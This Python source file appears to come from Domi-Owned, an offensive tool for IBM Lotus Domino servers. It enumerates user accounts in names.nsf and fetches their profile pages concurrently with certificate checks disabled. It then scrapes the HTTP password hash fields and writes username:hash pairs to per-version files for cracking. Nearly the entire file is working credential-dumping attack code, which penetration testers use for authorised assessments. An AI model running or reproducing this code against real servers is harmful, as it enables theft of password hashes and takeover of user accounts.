# Copyright (c) 2016, Brandan Geise [coldfusion]
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import re
import requests
from bs4 import BeautifulSoup
from simple_requests import Requests

from domi_owned import utility

try:
	requests.packages.urllib3.disable_warnings()
except:
	pass


# Get user profile URLs
def enum_accounts(target, username, password, auth):
	accounts = []
	account_urls = []

	names_url = "{0}/names.nsf".format(target)

	for page in range(1, 100000, 1000):
		pages = "{0}/names.nsf/74eeb4310586c7d885256a7d00693f10?ReadForm&Start={1}&Count=1000".format(target, page)
		try:
			if auth == 'basic':
				access = utility.basic_auth(names_url, username, password)
			elif auth == 'form':
				access, session = utility.form_auth(names_url, username, password)
			else:
				access = None

			if access or auth == 'open':
				if auth == 'basic':
					request = requests.get(pages, headers=utility.get_headers(), auth=(username, password), timeout=60, verify=False)
				elif auth == 'form':
					request = session.get(pages, headers=utility.get_headers(), timeout=60, verify=False)
				else:
					request = requests.get(pages, headers=utility.get_headers(), timeout=60, verify=False)

				soup = BeautifulSoup(request.text, 'lxml')
				empty_page = soup.findAll('h2')
				if empty_page:
					break
				else:
					links = [a.attrs.get('href') for a in soup.select('a[href^=/names.nsf/]')]
					for link in links:
						account_regex = re.compile('/([a-f0-9]{32}/[a-f0-9]{32})', re.I)
						if account_regex.search(link) and account_regex.search(link).group(1) not in accounts:
							accounts.append(account_regex.search(link).group(1))
						else:
							pass
			else:
				utility.print_warn("Unable to access {0}, bad username or password!".format(names_url))
				break

		except Exception as error:
			utility.print_error("Error: {0}".format(error))
			break

	if len(accounts) > 0:
		if len(accounts) == 1:
			plural = ''
		else:
			plural = 's'
		utility.print_good("Found {0} account{1}".format(len(accounts), plural))

		for unid in accounts:
			account_urls.append("{0}/names.nsf/{1}?OpenDocument".format(target, unid))

		async_requests(account_urls, username, password)
	else:
		utility.print_warn('No hashes found!')


# Asynchronously get accounts
def async_requests(accounts, username, password):
	requests = Requests(concurrent=40)
	requests.session.headers = utility.get_headers()
	requests.session.auth = (username, password)
	requests.session.verify = False

	try:
		for account_url in requests.swarm(accounts, maintainOrder=False):
			if account_url.status_code == 200:
				get_domino_hash(account_url)

	except KeyboardInterrupt:
		requests.stop(killExecuting=True)


# Dump Domino hashes
def get_domino_hash(response):
	soup = BeautifulSoup(response.text, 'lxml')
	try:

		# Get account username
		username_params = ['$dspShortName', '$dspFullName']
		for user_param in username_params:
			domino_username = (soup.find('input', attrs={'name': user_param}))['value']
			if len(domino_username) > 0:
				break
			else:
				continue

		# Get account hash
		hash_params = ['$dspHTTPPassword', 'dspHTTPPassword', 'HTTPPassword']
		for hash_param in hash_params:
			domino_hash = (soup.find('input', attrs={'name': hash_param}))['value']
			if len(domino_hash) > 0:
				break
			else:
				continue

	except:
		pass

	if domino_username and domino_hash:
		print "{0}, {1}".format(domino_username.encode('utf-8'), domino_hash)
		write_hash(domino_username.encode('utf-8'), domino_hash)


# Sort and write hashes to file
def write_hash(duser, dhash):
	# Domino 5 hash format: 3dd2e1e5ac03e230243d58b8c5ada076
	if len(dhash) == 34:
		dhash = dhash.strip('()')
		outfile = 'domino_5_hashes.txt'
	# Domino 6 hash format: (GDpOtD35gGlyDksQRxEU)
	elif len(dhash) == 22:
		outfile = 'domino_6_hashes.txt'
	# Domino 8 hash format: (HsjFebq0Kh9kH7aAZYc7kY30mC30mC3KmC30mCluagXrvWKj1)
	else:
		outfile = 'domino_8_hashes.txt'

	# Write to file
	output = open(outfile, 'a')
	hash_format = "{0}:{1}\n".format(duser, dhash)
	output.write(hash_format)
	output.close()
